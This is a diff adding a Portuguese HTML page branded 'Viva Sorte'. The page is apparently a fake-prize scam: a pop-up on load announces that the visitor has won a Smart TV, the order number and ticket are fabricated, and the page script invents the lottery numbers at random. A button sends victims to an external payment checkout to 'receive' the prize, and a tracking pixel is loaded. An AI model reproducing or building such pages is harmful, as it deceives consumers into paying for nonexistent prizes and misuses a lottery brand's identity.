@@ -1,0 +1,914 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+        
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Viva Sorte</title>
+  <!-- resto do conteúdo -->
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script><style>
+    .cota {
+      transition: all 0.3s ease;
+    }
+    .cota-selected {
+      border: 3px solid #28a745;
+      box-shadow: 0 0 10px rgba(40, 167, 69, 0.7);
+    }
+    .adc-carrinho {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: bold;
+      background-color: #ccc;
+      color: #fff;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
+    }
+    .adc-carrinho.ativo {
+      background-color: #3ddc84; /* tom mais verdinho */
+    }
+  </style><style>
+    .barra-destaque {
+      background-color: #2f4eb5;
+      color: #fff;
+      font-size: 1.1rem;
+      font-weight: 600;
+      text-align: center;
+      padding: 12px 20px;
+      border-radius: 8px;
+      margin: 0 auto 15px auto;
+      max-width: 100%;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      position: relative;
+      z-index: 9;
+    }
+
+    .barra-destaque span {
+      color: #ffdd57;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .barra-fixa {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      border-radius: 0;
+      margin: 0;
+      display: none;
+      z-index: 999;
+    }
+  </style><style>
+    .cota {
+      transition: all 0.3s ease;
+    }
+    .cota-selected {
+      border: 3px solid #28a745;
+      box-shadow: 0 0 10px rgba(40, 167, 69, 0.7);
+    }
+    .adc-carrinho {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: bold;
+      background-color: #ccc;
+      color: #fff;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
+    }
+    .adc-carrinho.ativo {
+      background-color: #3ddc84; /* tom mais verdinho */
+    }
+  </style><style>
+  .blur-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    backdrop-filter: blur(6px);
+    background-color: rgba(0, 0, 0, 0.3);
+    z-index: 9998;
+    display: none;
+  }
+
+  .notificacao-premio {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: #e0f7ff;
+    color: #003366;
+    padding: 30px 40px;
+    border-radius: 20px;
+    box-shadow: 0 0 30px rgba(0, 153, 255, 0.4);
+    z-index: 9999;
+    width: 90%;
+    max-width: 420px;
+    font-family: 'Arial', sans-serif;
+    text-align: center;
+    animation: fadeIn 0.3s ease forwards;
+  }
+
+  .notificacao-premio p {
+    margin: 10px 0;
+    font-size: 16px;
+    line-height: 1.5;
+  }
+
+  .notificacao-premio .titulo {
+    font-size: 22px;
+    color: #007BFF;
+    font-weight: bold;
+  }
+
+  .notificacao-premio .premio {
+    font-size: 22px;
+    color: #ff6600;
+    font-weight: bold;
+  }
+
+  .notificacao-premio strong {
+    color: #007BFF;
+  }
+
+  .notificacao-premio button {
+    background-color: #007BFF;
+    color: #fff;
+    font-weight: bold;
+    border: none;
+    border-radius: 30px;
+    padding: 12px 25px;
+    font-size: 16px;
+    margin-top: 15px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+
+  .notificacao-premio button:hover {
+    background-color: #0056b3;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translate(-50%, -60%); }
+    to { opacity: 1; transform: translate(-50%, -50%); }
+  }
+</style></head>
+
+   
+  
+  
+
+
+  
+
+
+<body>
+  <!-- SOBREPOSIÇÃO COM DESFOQUE -->
+  <div class="blur-overlay" id="blurOverlay"></div>
+
+  <!-- NOTIFICAÇÃO CENTRALIZADA -->
+  <div class="notificacao-premio" id="notificacaoPremio">
+  <p class="titulo">🎉 <strong>PARABENS</strong> 🎉</p>
+<p>Você acaba de ganhar <strong>Uma Smart TV 60 UHD 4K</strong> <br> E ainda não acabou! Você também ganhou <strong>50% de DESCONTO</strong> no frete para a sua região.</p>
+
+<style>
+  .imagem-premio-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    padding: 20px;
+  }
+
+  .brilho-fundo {
+    position: absolute;
+    width: 200px;
+    height: 200px;
+    background: radial-gradient(circle, rgba(0, 255, 0, 0.5) 0%, transparent 70%);
+    animation: pulsar 2.5s infinite ease-in-out;
+    border-radius: 50%;
+    z-index: 0;
+  }
+
+  .imagem-premio {
+    width: 180px;
+    height: auto;
+    animation: puloSuave 2s ease-in-out infinite;
+    position: relative;
+    z-index: 1;
+  }
+
+  @keyframes puloSuave {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+  }
+
+  @keyframes pulsar {
+    0%, 100% { transform: scale(1); opacity: 0.7; }
+    50% { transform: scale(1.2); opacity: 0.8; }
+  }
+</style>
+
+<div class="imagem-premio-container">
+  <div class="brilho-fundo"></div>
+  <img src="images/IP.png" alt="Prêmio" class="imagem-premio">
+</div>
+
+
+
+<p class="premio" style="color: green;">+50% DE DESCONTO NO FRETE</p>
+  <button onclick="fecharNotificacao()">RESGATAR PRÊMIOS</button>
+</div>
+
+
+
+<script>
+  function fecharNotificacao() {
+    document.getElementById('notificacaoPremio').style.display = 'none';
+    document.getElementById('blurOverlay').style.display = 'none';
+  }
+
+  window.onload = function () {
+    setTimeout(() => {
+      document.getElementById('notificacaoPremio').style.display = 'block';
+      document.getElementById('blurOverlay').style.display = 'block';
+    }, 500);
+  }
+</script>
+
+<script>
+  window.pixelId = "680da5f23852d64b38dd3342";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+
+ 
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Viva Sorte</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+  
+  
+  .shine-button {
+  position: relative;
+  background: linear-gradient(270deg, #1400c8, #007bff, #1400c8);
+  background-size: 600% 600%;
+  color: white;
+  font-weight: bold;
+  border: none;
+  padding: 15px 25px;
+  border-radius: 50px;
+  font-size: 14px;
+  width: 100%;
+  max-width: 280px;
+  cursor: pointer;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+  animation: gradientMove 4s ease infinite, pulse 2s infinite;
+  overflow: hidden;
+}
+
+@keyframes gradientMove {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+.shine-button::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -75%;
+  width: 50%;
+  height: 100%;
+  background: linear-gradient(120deg, rgba(255,255,255,0.4) 0%, rgba(255,255,255,0) 100%);
+  transform: skewX(-20deg);
+  animation: shineEffect 3s ease-in-out infinite;
+}
+
+@keyframes shineEffect {
+  0% { left: -75%; }
+  50% { left: 100%; }
+  100% { left: 100%; }
+}
+
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background-color: #fff;
+      color: #333;
+      text-align: center;
+    }
+
+    header {
+      display: flex;
+      align-items: center;
+      padding: 10px 15px;
+      position: relative;
+      justify-content: flex-start;
+    }
+
+    header img {
+      max-height: 60px;
+    }
+
+    .banner img {
+      width: 100%;
+      max-width: 100%;
+      height: auto;
+    }
+
+    .sorteio-date {
+      margin: 20px 0;
+    }
+
+    .resumo-container {
+      margin: 30px auto;
+      padding: 0 20px;
+    }
+
+    .resumo-container h2 {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+
+    .display-container {
+      width: 90%;
+      max-width: 400px;
+      margin: 0 auto;
+      border: 2px solid #1a4dff;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    .display-header {
+      background-color: #1a4dff;
+      color: #fff;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 15px;
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    .display-header span:last-child {
+      background-color: #d0dfff;
+      color: #1a4dff;
+      padding: 5px 10px;
+      border-radius: 5px;
+      font-weight: 700;
+    }
+
+    .display-grid {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 10px;
+      padding: 15px;
+    }
+
+    .number-circle {
+      width: 36px;
+      height: 36px;
+      border: 2px solid #1a4dff;
+      color: #1a4dff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 14px;
+      margin: auto;
+    }
+
+    .ctaimg img {
+      max-width: 90%;
+      height: auto;
+      display: block;
+      margin: 20px auto;
+      cursor: pointer;
+    }
+
+    .resgate-btn {
+      background: linear-gradient(90deg, rgba(9,5,80,1) 0%, rgba(9,9,121,1) 49%, rgba(0,46,255,1) 100%);
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      font-weight: 700;
+      border-radius: 40px;
+      cursor: pointer;
+      margin: 20px auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 5px 15px rgba(42, 157, 143, 0.4);
+      transition: all 0.3s ease;
+      max-width: 280px;
+    }
+
+    .resgate-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 8px 20px rgba(42, 157, 143, 0.6);
+    }
+
+    @keyframes pulse {
+      0% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.05);
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    @media (max-width: 420px) {
+      .display-grid {
+        grid-template-columns: repeat(4, 1fr);
+      }
+
+      .number-circle {
+        width: 32px;
+        height: 32px;
+        font-size: 12px;
+      }
+    }
+  </style>
+
+
+  <header>
+    <img src="images/logo.png" alt="Logo Viva Sorte">
+  </header>
+
+
+    <div class="sorteio-date">
+      <p><strong>Número do pedido:</strong> <a href="#">00044792</a></p>
+    </div>
+
+    <div class="ticket-container">
+      <img src="images/T-TULO-PREMIADO-EM-DOBRO-1.png" alt="Ticket" style="max-width: 100%; height: auto;">
+    </div>
+
+<style>
+  .imagem-premio-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    padding: 20px;
+  }
+
+  .brilho-fundo {
+    position: absolute;
+    width: 200px;
+    height: 200px;
+    background: radial-gradient(circle, rgba(0, 255, 0, 0.5) 0%, transparent 70%);
+    animation: pulsar 2.5s infinite ease-in-out;
+    border-radius: 50%;
+    z-index: 0;
+  }
+
+  .imagem-premio {
+    width: 180px;
+    height: auto;
+    animation: puloSuave 2s ease-in-out infinite;
+    position: relative;
+    z-index: 1;
+  }
+
+  @keyframes puloSuave {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+  }
+
+  @keyframes pulsar {
+    0%, 100% { transform: scale(1); opacity: 0.7; }
+    50% { transform: scale(1.2); opacity: 0.8; }
+  }
+</style>
+
+<div class="imagem-premio-container">
+  <div class="brilho-fundo"></div>
+  <img src="images/IP.png" alt="Prêmio" class="imagem-premio">
+</div>
+
+    <div class="ctaimg" style="margin-top: -60px; animation: pulse 2s infinite;">
+      <img src="images/Design-sem-nome.png" alt="Botão Resgate" onclick="openPopup()" style="width: 350px; max-width: 90%;">
+    </div>
+    
+    <style>
+  .popup-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+    backdrop-filter: blur(5px);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    animation: fadeIn 0.4s ease-out;
+  }
+
+  .popup-overlay.active {
+    display: flex;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+</style>
+<!-- POPUP MODERNO -->
+<div class="popup-overlay" id="popup">
+  <div class="popup-content" style="position: relative; max-width: 360px; background: white; border-radius: 16px; padding: 25px 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
+    <span onclick="closePopup()" style="position: absolute; top: 12px; right: 18px; font-size: 22px; font-weight: bold; color: #444; cursor: pointer; z-index: 10;">
+  ×
+</span>
+
+
+    <img src="images/logo.png" alt="Logo Viva Sorte" style="max-width: 130px; margin-bottom: 15px;">
+
+    <h2 style="font-size: 20px; color: #111; font-weight: 700; margin-bottom: 5px;">PARABÉNS!</h2>
+    <p style="font-size: 14px; color: #666;">Você acaba de ganhar UMA</p>
+    
+    <h1 style="font-size: 22px; color: #1a4dff; font-weight: 800; margin: 10px 0;">Smart TV 60 POLEGADAS 4K</h1>
+
+<img src="images/IPNHO-IPORDS-3.png" alt="iPhones" style="width: 100%; max-width: 250px; animation: pulse 2s infinite;">
+
+    <p style="font-size: 14px; color: #444; margin: 10px 0;">
+      Sua sorte está brilhando hoje! Você foi um dos sortudos a ganhar UMA Smart TV 60 POLEGADAS 4K.
+    </p>
+    <p style="font-size: 14px; font-weight: 600; color: #333;">
+      Agora só precisamos confirmar como você deseja receber este prêmio incrível!
+    </p>
+
+    <button class="shine-button" onclick="window.location.href='https://pay.compraeguraapay.com.br/checkout/36e3bfb0-0838-4612-b2e2-1e341de82244';" style="margin-top: 20px; background: linear-gradient(90deg, #1400c8, #007bff); color: white; font-weight: bold; border: none; padding: 15px 25px; border-radius: 50px; font-size: 14px; width: 100%; max-width: 280px; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.2);animation: pulse 2s infinite;">
+      🎁 QUERO RECEBER MINHA TV!
+    </button>
+  </div>
+</div>
+
+    <div class="resumo-container">
+      <h2>RESUMO<br><span style="font-weight: 400;">da sua compra:</span></h2>
+
+    </div>
+
+<div class="display-container">
+  <div class="display-header">
+    <span>Título</span>
+    <span>19658489546</span>
+  </div>
+
+  <!-- 20 Números visíveis -->
+  <div class="display-grid">
+    <div class="number-circle">04</div><div class="number-circle">07</div><div class="number-circle">08</div>
+    <div class="number-circle">21</div><div class="number-circle">22</div><div class="number-circle">23</div>
+    <div class="number-circle">24</div><div class="number-circle">26</div><div class="number-circle">27</div>
+    <div class="number-circle">28</div><div class="number-circle">30</div><div class="number-circle">32</div>
+    <div class="number-circle">33</div><div class="number-circle">34</div><div class="number-circle">41</div>
+    <div class="number-circle">42</div><div class="number-circle">43</div><div class="number-circle">44</div>
+    <div class="number-circle">52</div><div class="number-circle">56</div>
+  </div>
+
+  <!-- Botões -->
+  <div style="margin: 20px 0;">
+    <button id="lerMaisBtn" class="botao-lermais">Ver Todos</button>
+    <button id="mostrarMenosBtn" class="botao-lermais" style="display: none; background-color: #888;">Mostrar menos</button>
+  </div>
+
+  <!-- Números ocultos -->
+ <div class="display-grid" id="numeros-ocultos" style="display: none; opacity: 0;">
+  <div class="number-circle">75</div><div class="number-circle">93</div><div class="number-circle">98</div>
+  <div class="number-circle">62</div><div class="number-circle">89</div><div class="number-circle">63</div>
+  <div class="number-circle">74</div><div class="number-circle">95</div><div class="number-circle">36</div>
+  <div class="number-circle">55</div><div class="number-circle">47</div><div class="number-circle">25</div>
+  <div class="number-circle">91</div><div class="number-circle">81</div><div class="number-circle">03</div>
+  <div class="number-circle">80</div><div class="number-circle">31</div><div class="number-circle">57</div>
+  <div class="number-circle">85</div><div class="number-circle">73</div><div class="number-circle">53</div>
+  <div class="number-circle">68</div><div class="number-circle">70</div><div class="number-circle">83</div>
+  <div class="number-circle">71</div><div class="number-circle">59</div><div class="number-circle">64</div>
+  <div class="number-circle">88</div><div class="number-circle">99</div><div class="number-circle">90</div>
+  <div class="number-circle">72</div><div class="number-circle">69</div><div class="number-circle">94</div>
+  <div class="number-circle">77</div><div class="number-circle">50</div><div class="number-circle">78</div>
+  <div class="number-circle">15</div><div class="number-circle">48</div><div class="number-circle">84</div>
+  <div class="number-circle">86</div><div class="number-circle">16</div><div class="number-circle">39</div>
+  <div class="number-circle">38</div><div class="number-circle">37</div><div class="number-circle">61</div>
+  <div class="number-circle">54</div><div class="number-circle">19</div><div class="number-circle">96</div>
+  <div class="number-circle">18</div><div class="number-circle">58</div><div class="number-circle">40</div>
+  <div class="number-circle">46</div><div class="number-circle">65</div><div class="number-circle">97</div>
+  <div class="number-circle">87</div><div class="number-circle">29</div><div class="number-circle">51</div>
+  <div class="number-circle">60</div><div class="number-circle">82</div><div class="number-circle">14</div>
+  <div class="number-circle">09</div><div class="number-circle">17</div><div class="number-circle">79</div>
+  <div class="number-circle">12</div><div class="number-circle">13</div><div class="number-circle">45</div>
+  <div class="number-circle">02</div><div class="number-circle">05</div><div class="number-circle">01</div>
+  <div class="number-circle">35</div><div class="number-circle">20</div><div class="number-circle">76</div>
+  <div class="number-circle">49</div><div class="number-circle">92</div><div class="number-circle">67</div>
+  <div class="number-circle">66</div><div class="number-circle">10</div><div class="number-circle">06</div>
+  <div class="number-circle">11</div><div class="number-circle">47</div>
+</div>
+
+</div>
+
+<style>
+  .display-grid {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 10px;
+    padding: 15px;
+  }
+
+  .number-circle {
+    width: 36px;
+    height: 36px;
+    border: 2px solid #1a4dff;
+    color: #1a4dff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 600;
+    font-size: 14px;
+    margin: auto;
+  }
+
+  .botao-lermais {
+    background-color: #1a4dff;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    font-size: 15px;
+    font-weight: 600;
+    border-radius: 30px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    margin: 0 5px;
+  }
+
+  .botao-lermais:hover {
+    transform: scale(1.05);
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  @keyframes fadeOut {
+    from { opacity: 1; }
+    to { opacity: 0; }
+  }
+</style>
+
+<script>
+  const btnLerMais = document.getElementById('lerMaisBtn');
+  const btnMostrarMenos = document.getElementById('mostrarMenosBtn');
+  const gridOculto = document.getElementById('numeros-ocultos');
+
+  btnLerMais.addEventListener('click', () => {
+    gridOculto.style.display = 'grid';
+    gridOculto.style.animation = 'fadeIn 0.4s ease';
+    gridOculto.style.opacity = '1';
+    btnLerMais.style.display = 'none';
+    btnMostrarMenos.style.display = 'inline-block';
+  });
+
+  btnMostrarMenos.addEventListener('click', () => {
+    gridOculto.style.animation = 'fadeOut 0.4s ease';
+    gridOculto.style.opacity = '0';
+
+    setTimeout(() => {
+      gridOculto.style.display = 'none';
+    }, 400);
+
+    btnMostrarMenos.style.display = 'none';
+    btnLerMais.style.display = 'inline-block';
+  });
+</script>
+
+
+  <!-- Números ocultos -->
+  <div class="display-grid" id="numeros-ocultos"></div>
+
+
+<!-- Estilos -->
+<style>
+  .display-grid {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 10px;
+    padding: 15px;
+  }
+
+  .number-circle {
+    width: 36px;
+    height: 36px;
+    border: 2px solid #1a4dff;
+    color: #1a4dff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 600;
+    font-size: 14px;
+    margin: auto;
+  }
+
+  @media (max-width: 420px) {
+    .display-grid {
+      grid-template-columns: repeat(4, 1fr);
+    }
+
+    .number-circle {
+      width: 32px;
+      height: 32px;
+      font-size: 12px;
+    }
+  }
+
+  #numeros-ocultos {
+    display: none;
+    opacity: 0;
+    transition: opacity 0.5s ease;
+  }
+
+  #numeros-ocultos.mostrar {
+    display: grid;
+    opacity: 1;
+  }
+
+  .botao-lermais {
+    background-color: #1a4dff;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    font-size: 15px;
+    font-weight: 600;
+    border-radius: 30px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    margin: 0 5px;
+  }
+
+  .botao-lermais:hover {
+    transform: scale(1.05);
+  }
+</style>
+
+<!-- Script -->
+<script>
+  const lerMaisBtn = document.getElementById('lerMaisBtn');
+  const mostrarMenosBtn = document.getElementById('mostrarMenosBtn');
+  const numerosOcultos = document.getElementById('numeros-ocultos');
+
+  const numerosJaUsados = [
+    "04", "07", "08", "21", "22", "23", "24", "26", "27", "28",
+    "30", "32", "33", "34", "41", "42", "43", "44", "52", "56"
+  ];
+
+  function gerarNumerosAleatorios(qtd, ignorar = []) {
+    const numeros = new Set();
+    while (numeros.size < qtd) {
+      const numero = String(Math.floor(Math.random() * 99) + 1).padStart(2, '0');
+      if (!ignorar.includes(numero)) {
+        numeros.add(numero);
+      }
+    }
+    return Array.from(numeros);
+  }
+
+  function criarElementoNumero(numero) {
+    const div = document.createElement('div');
+    div.className = 'number-circle';
+    div.textContent = numero;
+    return div;
+  }
+
+  lerMaisBtn.addEventListener('click', function () {
+    // Apenas gerar se ainda não tiver números
+    if (numerosOcultos.children.length === 0) {
+      const novosNumeros = gerarNumerosAleatorios(80, numerosJaUsados);
+      novosNumeros.forEach(num => {
+        numerosOcultos.appendChild(criarElementoNumero(num));
+      });
+    }
+
+    numerosOcultos.classList.add('mostrar');
+    lerMaisBtn.style.display = 'none';
+    mostrarMenosBtn.style.display = 'inline-block';
+  });
+
+  mostrarMenosBtn.addEventListener('click', function () {
+    numerosOcultos.classList.remove('mostrar');
+    setTimeout(() => {
+      numerosOcultos.style.display = 'none';
+      numerosOcultos.style.opacity = 0;
+    }, 300);
+
+    mostrarMenosBtn.style.display = 'none';
+    lerMaisBtn.style.display = 'inline-block';
+  });
+</script>
+
+
+
+    <div class="container-principal" style="max-width: 500px; margin: 30px auto;">
+    </div>
+
+    <!-- Novo Rodapé com imagens personalizadas -->
+    <footer style="background-color: #f9f9f9; padding: 30px 15px; text-align: left;">
+      <div style="margin-bottom: 20px; text-align: left;">
+  <img src="images/logo.png" alt="Logo Viva Sorte" style="max-height: 60px;">
+</div>
+
+
+      <div style="margin-bottom: 20px;">
+        <img src="images/viva-hosp.png" alt="Informações do Rodapé" style="max-width: 100%; height: auto;">
+      </div>
+
+      <div style="margin-bottom: 20px;">
+        <img src="images/viacap.png" alt="Logos de parceiros" style="max-width: 100%; height: auto;">
+      </div>
+    </footer>
+<script>
+  function openPopup() {
+    document.getElementById('popup').classList.add('active');
+  }
+
+  function closePopup() {
+    setTimeout(() => {
+      document.getElementById('popup').classList.remove('active');
+    }, 300); // 300ms de delay para fechar
+  }
+</script>
+
+<script>
+  function mostrarMaisNumeros(event) {
+    const ocultos = document.getElementById('numeros-ocultos');
+    ocultos.style.opacity = '1';
+    ocultos.style.pointerEvents = 'auto';
+    event.target.style.display = 'none';
+  }
+</script>
+
+
+
+  
+  <script>
+  // 1. Carrega imagens apenas quando estão visíveis (Lazy Load)
+  document.addEventListener("DOMContentLoaded", function () {
+    const imgs = document.querySelectorAll("img[loading='lazy'], iframe[loading='lazy']");
+    imgs.forEach(el => {
+      el.loading = "lazy";
+    });
+  });
+
+  // 2. Marca recursos pesados para carregar após o carregamento inicial
+  window.addEventListener('load', function () {
+    // Adiciona async a scripts que ainda não tem
+    document.querySelectorAll('script[src]:not([async])').forEach(script => {
+      script.setAttribute('async', '');
+    });
+
+    // Remove classes e atributos que não são mais usados após render
+    document.querySelectorAll('[data-remove-after-load]').forEach(el => el.remove());
+
+    // Atrasar carregamento de iframes que estão escondidos
+    setTimeout(() => {
+      document.querySelectorAll('iframe[data-src]').forEach(iframe => {
+        iframe.src = iframe.dataset.src;
+      });
+    }, 2000);
+  });
+
+  // 3. Remover espaços em branco no HTML (simples minificação visual)
+  document.body.innerHTML = document.body.innerHTML.replace(/>\s+</g, '><');
+</script>
+
+
+
+</body></html>
